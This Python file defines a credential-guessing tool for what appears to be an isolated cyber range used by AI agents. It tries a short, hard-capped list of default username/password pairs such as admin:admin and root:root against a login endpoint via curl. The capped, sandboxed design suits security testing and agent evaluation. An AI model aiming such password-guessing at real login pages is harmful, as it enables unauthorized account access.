"""Credential-attack tool: tries a small wordlist against a login endpoint.

Bounded by design — a fixed, short candidate list and a hard attempt cap —
so a misbehaving agent can't turn this into a real brute-force flood even
inside the isolated range. Runs via `curl` inside the attacker container,
same reasoning as `web.py`/`recon.py`.
"""

from __future__ import annotations

from typing import Any

from app.models.schemas import ToolResult
from app.tools.base import Tool, ToolSpec
from app.tools.container_exec import ContainerExecError, exec_in_container

MAX_ATTEMPTS = 25

DEFAULT_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("root", "root"),
    ("user", "user"),
]


class CredentialStuffTool(Tool):
    def __init__(self, docker_client, attacker_container_name: str, timeout_s: int = 5) -> None:
        self.docker_client = docker_client
        self.attacker_container_name = attacker_container_name
        self.timeout_s = timeout_s
        self.spec = ToolSpec(
            name="try_credentials",
            description=(
                "Attempt a small, fixed set of common username/password pairs "
                f"(max {MAX_ATTEMPTS}) against a login endpoint in the target range."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "url": {"type": "string"},
                    "username_field": {"type": "string", "default": "username"},
                    "password_field": {"type": "string", "default": "password"},
                    "success_marker": {
                        "type": "string",
                        "description": "Substring expected in the response body on success",
                    },
                },
                "required": ["url", "success_marker"],
            },
        )

    def run(self, **kwargs: Any) -> ToolResult:
        url: str = kwargs["url"]
        user_field: str = kwargs.get("username_field", "username")
        pass_field: str = kwargs.get("password_field", "password")
        success_marker: str = kwargs["success_marker"]

        attempts = 0
        for username, password in DEFAULT_CREDENTIALS[:MAX_ATTEMPTS]:
            attempts += 1
            argv = [
                "curl",
                "-s",
                "--max-time",
                str(self.timeout_s),
                "--data-urlencode",
                f"{user_field}={username}",
                "--data-urlencode",
                f"{pass_field}={password}",
                url,
            ]
            try:
                exit_code, output = exec_in_container(self.docker_client, self.attacker_container_name, argv)
            except ContainerExecError as exc:
                return ToolResult(ok=False, output="", error=str(exc))

            if exit_code != 0:
                return ToolResult(ok=False, output="", error=f"curl exited {exit_code}: {output[:500]}")

            if success_marker in output:
                return ToolResult(ok=True, output=f"Success after {attempts} attempts: {username}:{password}")

        # ok=True: the tool ran correctly and answered the question asked —
        # "no valid credentials in this list" is a real result, not a failure.
        return ToolResult(ok=True, output=f"No valid credentials found in {attempts} attempts")
